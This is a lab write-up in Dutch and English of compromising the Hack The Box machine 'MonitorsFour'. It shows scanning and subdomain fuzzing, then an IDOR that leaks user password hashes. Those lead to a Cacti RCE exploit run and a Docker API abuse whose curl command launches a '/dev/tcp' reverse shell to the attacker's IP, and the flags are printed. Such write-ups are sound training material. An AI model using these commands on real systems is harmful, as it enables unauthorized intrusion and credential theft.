# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/MonitorsFour]
└─$ nmap 10.129.7.126                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 13:44 CET
Nmap scan report for 10.129.7.126
Host is up (0.019s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/MonitorsFour]
└─$ nmap -p 80,5985 -sCV 10.129.7.126
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 13:45 CET
Nmap scan report for 10.129.7.126
Host is up (0.017s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Zoals altijd de FQDN gaan toevoegen aan de hosts file. Nu ben ik naar de webpagina gaan kijken en daar kan je niet veel interessante information vinden. Ik ben dus gaan zoeken of dat je geen subdomain hebt en dit door gebruik te maken van het onderstaande commando kan je zien dat er een subdomain `cacti` is. 

```
┌──(kali㉿kali)-[~/HTB/MonitorsFour]
└─$ ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -H "HOST:FUZZ.monitorsfour.htb" -ac

cacti                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 23ms]
:: Progress: [29999/29999] :: Job [1/1] :: 1379 req/sec :: Duration: [0:00:18] :: Errors: 1 ::
```

Nu zal ik deze gaan toevoegen aan de hosts file en een keer gaan kijken naar de webpagina. Daar kan je zien dat de webserver op versie 1.2.28 draait. 

![[Pasted image 20251208121852.png]]

Binnen het ffuf commando kan je zien dat er een user dir bestaat. maar hierbij krijg ik de volgende error te zien.

```
┌──(kali㉿kali)-[~/HTB/MonitorsFour/CVE-2025-24367-Cacti-PoC]
└─$ ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  -ac                               
contact                 [Status: 200, Size: 367, Words: 34, Lines: 5, Duration: 51ms]
login                   [Status: 200, Size: 4340, Words: 1342, Lines: 96, Duration: 66ms]
user                    [Status: 200, Size: 35, Words: 3, Lines: 1, Duration: 44ms]
static                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 22ms]
views                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 26ms]
controllers             [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 22ms]
forgot-password         [Status: 200, Size: 3099, Words: 164, Lines: 84, Duration: 44ms]

```

![[Pasted image 20251208133150.png]]

Zoals je hieronder kunt zien hebben we het password hash van 4 users. Ik zal deze gaan decrypten door gebruik te maken van crackstation.

```
http://monitorsfour.htb/user?id=2&token=0

[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```

Zoals je zult kunnen zien wordt alleen het password van de Administrator `Marcus` gevonden. De rest is not found.

![[Pasted image 20251208134333.png]]

Nu zal ik de user marcus en zijn password `wonderful1` kunnen gebruiken voor de onderstaande RCE exploit uittevoeren. De exploit die ik zal gebruiken voor de cacti v1.2.28 is het onderstaande CVE.
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
RCE command
```
┌──(kali㉿kali)-[~/HTB/MonitorsFour/CVE-2025-24367-Cacti-PoC]
└─$ python3 exploit.py \
  -u marcus \
  -p wonderful1 \
  -i 10.10.16.154 \
  -l 4444 \
  -url http://cacti.monitorsfour.htb 
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: Itoxb.php
[+] Got payload: /bash
[i] Created PHP filename: nVnKs.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80

```

Listener
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.7.126 61468
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$ 
```

Zoals je nu kunt zien zijn we ingelogged op de webserver als user www-data. Met deze user kan je gewoon de user flag binnen de marcus user zijn home dir vinden.

User flag: 5bd503e0d3eb2610927a95bf63f2ab16

```
www-data@821fbd6a43fa:/usr/bin$ cat /home/marcus/user.txt
cat /home/marcus/user.txt
5bd503e0d3eb2610927a95bf63f2ab16
```
Zoeken naar wrm ik ssrf moet gebruiken.
uname -a

```
www-data@821fbd6a43fa:~/html/cacti$ uname -a
uname -a
Linux 821fbd6a43fa 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 GNU/Linux
```
docker info
docker info | grep "Server Version"
hostname

Voor de root te worden ben ik gaan zoeken naar een SSRF exploit. Hierbij heb ik de volgende exploit gevonden. https://blog.qwertysecurity.com/Articles/blog3

```
www-data@821fbd6a43fa:/tmp$ curl -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "Image":"docker_setup-nginx-php:latest",
    "Cmd":["bash","-c","bash -i >& /dev/tcp/10.10.16.154/444 0>&1"],
    "HostConfig":{
      "Binds":["/mnt/host/c:/host_root"]
    }
  }' \
  -o create.json \
  http://192.168.65.7:2375/containers/create
```



```
www-data@821fbd6a43fa:/tmp$ cid=$(cut -d'"' -f4 create.json)
```


```
curl -X POST \
  -d '' \
  http://192.168.65.7:2375/containers/$cid/start
  
Listener
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 444 
Listening on 0.0.0.0 444
Connection received on 10.129.7.126 61477
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@e89e36b004d7:/var/www/html# 
```

Root flag: 6e5055c1a90fae11ade06fc52b061d4a

```
root@e89e36b004d7:/host_root/Users/Administrator/Desktop# cat roo
cat root.txt 
6e5055c1a90fae11ade06fc52b061d4a
```

![[Pasted image 20251208184318.png]]